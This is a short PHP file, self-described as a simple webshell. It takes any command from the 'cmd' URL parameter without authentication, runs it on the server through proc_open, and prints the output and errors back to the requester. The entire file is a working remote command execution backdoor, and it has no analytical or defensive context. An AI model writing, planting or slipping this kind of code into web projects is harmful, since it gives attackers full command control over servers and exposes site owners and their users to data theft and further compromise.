<?php
// Create a simple PHP webshell

// Define a custom function to execute commands
function execute_command($cmd) {
    // Use proc_open to execute the command
    $descriptors = [
        0 => ['pipe', 'r'], // stdin
        1 => ['pipe', 'w'], // stdout
        2 => ['pipe', 'w']  // stderr
    ];

    $process = proc_open($cmd, $descriptors, $pipes);

    if (is_resource($process)) {
        // Read the output
        $output = stream_get_contents($pipes[1]);
        $errors = stream_get_contents($pipes[2]);

        // Close the pipes
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        // Close the process
        proc_close($process);

        // Output the result
        echo "Output:\n";
        echo $output;

        echo "Errors:\n";
        echo $errors;
    }
}

// Check if a command parameter is provided
if (isset($_GET['cmd'])) {
    // Get the command from the URL parameter and execute it
    $command = $_GET['cmd'];
    execute_command($command);
}
?>
